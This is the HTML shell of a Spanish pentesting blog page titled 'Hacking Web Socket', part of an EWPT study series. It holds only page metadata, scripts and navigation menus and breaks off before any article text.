<!doctype html><html lang=es dir=ltr class=scroll-smooth data-default-appearance=dark data-auto-appearance=true><head><meta charset=utf-8><meta http-equiv=content-language content="es"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=theme-color><title>Hacking Web Socket &#183; Laboratorio Personal</title><meta name=title content="Hacking Web Socket &#183; Laboratorio Personal"><meta name=description content="Gu√≠a completa sobre vulnerabilidades en WebSockets, t√©cnicas de explotaci√≥n y laboratorios pr√°cticos de PortSwigger para mejorar la seguridad en comunicaciones bidireccionales en tiempo real."><link rel=canonical href=https://localhost:1313/preparacion-ewpt/web_socket/><link rel=alternate type=application/rss+xml href=/preparacion-ewpt/web_socket/index.xml title="Laboratorio Personal"><link type=text/css rel=stylesheet href=/css/main.bundle.min.1c9ae78cfe7254b31272a5b0fe180f02b039694ea28768f3223fa25a5dc7cfa25b6609046dd09bd5dd825bf2d7a61c4044d3e0f57e2c750f763b7786427c3509.css integrity="sha512-HJrnjP5yVLMScqWw/hgPArA5aU6ih2jzIj+iWl3Hz6JbZgkEbdCb1d2CW/LXphxARNPg9X4sdQ92O3eGQnw1CQ=="><script type=text/javascript src=/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj+e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
<script defer type=text/javascript id=script-bundle src=/js/main.bundle.min.30ca5ec92c2945211832adc0b719c04e454c1b4d5a90929559370e883e53bca7d18ee5ebda930d2b4863335259f4d5d6717b97c577fba7c418fd2c2d9409cc80.js integrity="sha512-MMpeySwpRSEYMq3AtxnATkVMG01akJKVWTcOiD5TvKfRjuXr2pMNK0hjM1JZ9NXWcXuXxXf7p8QY/SwtlAnMgA==" data-copy=Copiar data-copied=Copiado></script>
<script src=/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7+kfJ6kKCJxQGC+8wm+Bz9JucDjDTGNew=="></script>
<link rel=icon href=/img/favicon.ico type=image/x-icon><meta property="og:title" content="Hacking Web Socket"><meta property="og:description" content="Gu√≠a completa sobre vulnerabilidades en WebSockets, t√©cnicas de explotaci√≥n y laboratorios pr√°cticos de PortSwigger para mejorar la seguridad en comunicaciones bidireccionales en tiempo real."><meta property="og:type" content="website"><meta property="og:url" content="https://localhost:1313/preparacion-ewpt/web_socket/"><meta name=twitter:card content="summary"><meta name=twitter:title content="Hacking Web Socket"><meta name=twitter:description content="Gu√≠a completa sobre vulnerabilidades en WebSockets, t√©cnicas de explotaci√≥n y laboratorios pr√°cticos de PortSwigger para mejorar la seguridad en comunicaciones bidireccionales en tiempo real."><meta name=twitter:image content="https://localhost:1313/img/personaje.png"><meta property="og:image" content="https://localhost:1313/img/personaje.png"><meta name=author content="Josfull"><link href=https://x.com/josfull_2000 rel=me><link href=https://github.com/josfull rel=me><script src=/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj+KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-PEDMYR1V0K"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PEDMYR1V0K")</script></head><body class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Ir al contenido</a></div><div class=min-h-[148px]></div><div class="fixed inset-x-0 pl-[24px] pr-[24px] z-100"><div id=menu-blur class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl"></div><div class="relative max-w-[64rem] ml-auto mr-auto"><div class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 pt-[2px] pr-0 pb-[3px] pl-0"><div><a href=/ class=flex><span class=sr-only>Laboratorio Personal</span>
<img src=/img/home40.png width=40 height=40 class="logo max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom" alt="Laboratorio Personal"></a></div><div class="flex flex-1 items-center justify-between"><nav class="flex space-x-3"><a href=/ class="text-base font-medium text-gray-500 hover:text-gray-900">Laboratorio Personal</a></nav><nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12"><div><div class="cursor-pointer flex items-center nested-menu"><a href=/news/ class="text-base font-medium text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" title=News>News</a>
<span><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentcolor" aria-hidden="true"><path fill-rule="evenodd" d="M5.23 7.21a.75.75.0 011.06.02L10 11.168l3.71-3.938a.75.75.0 111.08 1.04l-4.25 4.5a.75.75.0 01-1.08.0l-4.25-4.5a.75.75.0 01.02-1.06z" clip-rule="evenodd"/></svg></span></span></div><div class="absolute menuhide"><div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl"><div class="flex flex-col space-y-3"><a href class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-sm font-sm" title>Divulgaciones</p></a><a href class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-sm font-sm" title>Parches</p></a><a href class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-sm font-sm" title>CVEs</p></a></div></div></div></div><div><div class="cursor-pointer flex items-center nested-menu"><a href=/diario/ class="text-base font-medium text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" title="Diario de un Pentester">Diario de un Pentester</a>
<span><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentcolor" aria-hidden="true"><path fill-rule="evenodd" d="M5.23 7.21a.75.75.0 011.06.02L10 11.168l3.71-3.938a.75.75.0 111.08 1.04l-4.25 4.5a.75.75.0 01-1.08.0l-4.25-4.5a.75.75.0 01.02-1.06z" clip-rule="evenodd"/></svg></span></span></div><div class="absolute menuhide"><div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl"><div class="flex flex-col space-y-3"><a href=/diario/enumeracion_de_sharepoints/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-sm font-sm" title="Enumeraci√≥n NTLM en SharePoint: Gu√≠a T√©cnica Completa">Enumeraci√≥n de SharePoints</p></a></div></div></div></div><div><div class="cursor-pointer flex items-center nested-menu"><a href=/preparacion-ewpt/ class="text-base font-medium text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" title>De 0 a EWPT</a>
<span><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentcolor" aria-hidden="true"><path fill-rule="evenodd" d="M5.23 7.21a.75.75.0 011.06.02L10 11.168l3.71-3.938a.75.75.0 111.08 1.04l-4.25 4.5a.75.75.0 01-1.08.0l-4.25-4.5a.75.75.0 01.02-1.06z" clip-rule="evenodd"/></svg></span></span></div><div class="absolute menuhide"><div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl"><div class="flex flex-col space-y-3"><a href class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-sm font-sm" title>SQLi Labs</p></a><a href class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-sm font-sm" title>Web Cache Poisoning</p></a><a href=/preparacion-ewpt/web_socket/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-sm font-sm" title="Hacking Web Socket">Web Socket</p></a><a href=/preparacion-ewpt/otg/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-sm font-sm" title="Metodolog√≠a OTG (OWASP Testing Guide)">OTG</p></a><a href=/preparacion-ewpt/otg-checklist/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-sm font-sm" title="Checklist personal OTG">OTG Checklist</p></a></div></div></div></div><div><div class="cursor-pointer flex items-center nested-menu"><a href=/scripts/ class="text-base font-medium text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" title=Scripts>Scripts</a>
<span><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentcolor" aria-hidden="true"><path fill-rule="evenodd" d="M5.23 7.21a.75.75.0 011.06.02L10 11.168l3.71-3.938a.75.75.0 111.08 1.04l-4.25 4.5a.75.75.0 01-1.08.0l-4.25-4.5a.75.75.0 01.02-1.06z" clip-rule="evenodd"/></svg></span></span></div><div class="absolute menuhide"><div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl"><div class="flex flex-col space-y-3"><a href=/scripts/bash/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-sm font-sm" title="üêâ Scripts de Bash">Bash</p></a><a href=/scripts/python/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-sm font-sm" title="üêç Scripts de Python">Python</p></a><a href=/scripts/go/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-sm font-sm" title="üß† Scripts de GO">Go</p></a></div></div></div></div><a href=/wordlists/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title="üìö Diccionarios personalizados para realizar fuzzing ">Wordlists</p></a><a href=https://x.com/josfull_2000 target=_blank class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><span><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></span></span><p class="text-base font-medium" title></p></a><a href=https://github.com/josfull target=_blank class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><span><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentcolor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span></span><p class="text-base font-medium" title></p></a><button id=search-button aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Buscar (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button><div class="flex items-center"><button id=appearance-switcher aria-label="Dark mode switcher" type=button class="text-base hover:text-primary-600 dark:hover:text-primary-400"><div class="flex items-center justify-center dark:hidden"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden dark:flex"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></nav><div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12"><span></span>
<button id=search-button-mobile aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Buscar (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button>
<button id=appearance-switcher-mobile aria-label="Dark mode switcher" type=button class="text-base hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-1 rtl:ml-1"><div class="flex items-center justify-center dark:hidden"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden dark:flex"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></div><div class="-my-2 md:hidden"><div id=menu-button class=block><div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentcolor" d="M0 96C0 78.33 14.33 64 32 64H416c17.7.0 32 14.33 32 32 0 17.7-14.3 32-32 32H32C14.33 128 0 113.7.0 96zM0 256c0-17.7 14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32H32c-17.67.0-32-14.3-32-32zM416 448H32c-17.67.0-32-14.3-32-32s14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32z"/></svg></span></div><div id=menu-wrapper class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]"><ul class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl"><li id=menu-close-button><span class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentcolor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></span></li><li class=mt-1><a href=/news/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title=News>News</p><span><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentcolor" aria-hidden="true"><path fill-rule="evenodd" d="M5.23 7.21a.75.75.0 011.06.02L10 11.168l3.71-3.938a.75.75.0 111.08 1.04l-4.25 4.5a.75.75.0 01-1.08.0l-4.25-4.5a.75.75.0 01.02-1.06z" clip-rule="evenodd"/></svg></span></span></a></li><li class=mt-1><a href class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-sm font-small" title>Divulgaciones</p></a></li><li class=mt-1><a href class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-sm font-small" title>Parches</p></a></li><li class=mt-1><a href class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-sm font-small" title>CVEs</p></a></li><li class=mb-2></li><li class=mt-1><a href=/diario/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title="Diario de un Pentester">Diario de un Pentester</p><span><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentcolor" aria-hidden="true"><path fill-rule="evenodd" d="M5.23 7.21a.75.75.0 011.06.02L10 11.168l3.71-3.938a.75.75.0 111.08 1.04l-4.25 4.5a.75.75.0 01-1.08.0l-4.25-4.5a.75.75.0 01.02-1.06z" clip-rule="evenodd"/></svg></span></span></a></li><li class=mt-1><a href=/diario/enumeracion_de_sharepoints/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-sm font-small" title="Enumeraci√≥n NTLM en SharePoint: Gu√≠a T√©cnica Completa">Enumeraci√≥n de SharePoints</p></a></li><li class=mb-2></li><li class=mt-1><a href=/preparacion-ewpt/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title>De 0 a EWPT</p><span><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentcolor" aria-hidden="true"><path fill-rule="evenodd" d="M5.23 7.21a.75.75.0 011.06.02L10 11.168l3.71-3.938a.75.75.0 111.08 1.04l-4.25 4.5a.75.75.0 01-1.08.0l-4.25-4.5a.75.75.0 01.02-1.06z" clip-rule="evenodd"/></svg></span></span></a></li><li class=mt-1><a href class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-sm font-small" title>SQLi Labs</p></a></li><li class=mt-1><a href class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-sm font-small" title>Web Cache Poisoning</p></a></li><li class=mt-1><a href=/preparacion-ewpt/web_socket/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-sm font-small" title="Hacking Web Socket">Web Socket</p></a></li><li class=mt-1><a href=/preparacion-ewpt/otg/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-sm font-small" title="Metodolog√≠a OTG (OWASP Testing Guide)">OTG</p></a></li><li class=mt-1><a href=/preparacion-ewpt/otg-checklist/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-sm font-small" title="Checklist personal OTG">OTG Checklist</p></a></li><li class=mb-2></li><li class=mt-1><a href=/scripts/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title=Scripts>Scripts</p><span><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentcolor" aria-hidden="true"><path fill-rule="evenodd" d="M5.23 7.21a.75.75.0 011.06.02L10 11.168l3.71-3.938a.75.75.0 111.08 1.04l-4.25 4.5a.75.75.0 01-1.08.0l-4.25-4.5a.75.75.0 01.02-1.06z" clip-rule="evenodd"/></svg></span></span></a></li><li class=mt-1><a href=/scripts/bash/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-sm font-small" title="üêâ Scripts de Bash">Bash</p></a></li><li class=mt-1><a href=/scripts/python/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-sm font-small" title="üêç Scripts de Python">Python</p></a></li><li class=mt-1><a href=/scripts/go/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-sm font-small" title="üß† Scripts de GO">Go</p></a></li><li class=mb-2></li><li class=mt-1><a href=/wordlists/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title="üìö Diccionarios personalizados para realizar fuzzing ">Wordlists</p></a></li><li class=mt-1><a href=https://x.com/josfull_2000 target=_blank class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><div><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></span></div><p class="text-bg font-bg" title></p></a></li><li class=mt-1><a href=https://github.com/josfull target=_blank class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><div><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentcolor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span></div><p class="text-bg font-bg" title></p></a></li></ul></div></div></div></div><script>(function(){var e=$(".main-menu"),t=window.location.pathname;e.find('a[href="'+t+'"]').each(function(e,t){$(t).children("p").addClass("active")})})()</script></div></div><script type=text/javascript src=/js/background-blur.min.78ad5090e7c0c2533bac9dd23bdb1f723f834e5c3626627bd31017cc139ce0651b529877862129cee49e380ab2fdcd8baef28ae3e086bc54957fdaa7758775b2.js integrity="sha512-eK1QkOfAwlM7rJ3SO9sfcj+DTlw2JmJ70xAXzBOc4GUbUph3hiEpzuSeOAqy/c2LrvKK4+CGvFSVf9qndYd1sg==" data-target-id=menu-blur></script><div class="relative flex flex-col grow"><main id=main-content class=grow><header><ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden"><li class=hidden><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/>JOSFULL ‚Äì Pentesting, CTFs & Ethical Hacking</a><span class="px-1 text-primary-500">/</span></li><li class=inline><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/preparacion-ewpt/>preparacion-ewpt</a><span class="px-1 text-primary-500">/</span></li><li class=hidden><a class="hover:underline decoration-neutral-300 